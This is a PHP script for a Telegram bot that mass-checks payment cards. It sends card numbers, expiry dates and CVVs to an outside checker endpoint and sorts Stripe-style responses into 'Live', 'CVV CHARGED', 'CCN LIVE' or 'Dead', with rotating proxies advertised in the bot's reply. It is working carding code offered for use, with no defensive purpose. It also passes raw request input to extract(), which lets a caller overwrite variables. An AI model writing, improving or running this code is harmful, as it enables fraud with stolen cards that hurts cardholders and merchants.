<?php

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
//====================FUNCTION END===============//
if (strpos($message, "/mass") === 0 || strpos($message, "!mass") === 0 || strpos($message, ".mass") === 0) {
    $message = substr($message,6);
if (empty($message)){
reply_to($chatId,$validauth,$message_id);
exit();
}
$stchk = "<b>Started Checking...</b>";
    $sendmes = "https://api.telegram.org/bot".$botToken."/sendMessage?chat_id=".$chatId."&text=".$stchk."&reply_to_message_id=".$message_id."&parse_mode=HTML";
    $sent = json_decode(file_get_contents($sendmes) ,1);
    global $mes_id;
    $mes_id = $sent['result']['message_id'];
    sleep(1);
    $aray = gibarray($message);
    $cout = count($aray);
    $total = $cout * 2;
    if (count($aray) > 5){
  $cmsg = "𝗧𝗛𝗜𝗦 𝗚𝗔𝗧𝗘 𝗜𝗦 𝗟𝗜𝗠𝗜𝗧𝗘𝗗 𝗧𝗢 𝗖𝗛𝗘𝗖𝗞 𝗙𝗢𝗥 5 𝗖𝗖 𝗢𝗡𝗟𝗬 ⚠️";
  editMessage($chatId,$cmsg,$mes_id);
    exit();
}
    else{
      global $fullmes;
      $fullmes = '';
	  //echo '<pre>'; print_r($aray); echo '</pre>';
      foreach ($aray as $cc){
		//echo "Checking : $cc <br>";
        $check = chemker1($cc);
		//echo "Result For $cc : $result<hr>";
      }
    }
}

function chemker1($lista){

  ///-----------------------CC PARSE -----------------------///
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lista-production-9b29.up.railway.app/chk.php?lista='.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: lista-production-9b29.up.railway.app',
'method: GET',
'path: chk.php?lista='.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'',
'scheme: https',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'accept-language: en-US,en;q=0.9',
'content-type: ',
'cookie: ',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: none',
'user-agent: Mozilla/5.0 (Linux; Android 12; M2003J15SC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36',
  ));

# ----------------- [2req Postfields] ---------------------#

$result2 = curl_exec($ch);

curl_close($ch);

if (strpos($result2, "Thank you for your message.")){
  $status = "Live 🟢";
$response = "CVV CHARGED 1$ 🔥";
}

elseif (strpos($result2, "security code is incorrect")){
  $status = "Live 🟢";
$response = "CCN LIVE ✅";
}

elseif (strpos($result2, "security code is invalid")){
  $status = "Live 🟢";
$response = "CCN LIVE ✅";
}

elseif (strpos($result2, "insufficient funds")){
  $status = "Live 🟢";
$response = "LOW FUNDS ✅";
}

elseif (strpos($result2, "not support")){
  $status = "Live 🟢";
$response = "CVV LIVE ✅";
}

elseif (strpos($result2, "Your card was declined.")){
  $status = "Dead 🔴";
$response = "GENERIC DECLINED ⭕";
}

else {
      $status = "Dead 🔴";
$response = "ERROR ❗";
}

//--------SMS SENT SECTION----------------//
  global $mes_id, $chatId , $fullmes;
$mainulstatus = "<b>Dead 🔴</b>";
$fullmes = $fullmes.'<b>CC - <code>'.$lista.'</code>
Result - '.$response.'</b>

';
$umass = "<b>𒀭  STRIPE AUTH 1$  𒀭
   ━━━━━━━━━━━━━</b>
";
$fmass = "<b>╭───────────────
𒆜 PROXY  : [ LIVE & ROTATING ]
𒆜 BOT BY : <a href='t.me/strawhatchannel69'>[ BE - OWNER  ]</a>
╰───────────────✘</b>";

$mallmsg = urlencode ("$umass
$fullmes
$fmass");
editMessagei($chatId,$mallmsg,$mes_id);

}
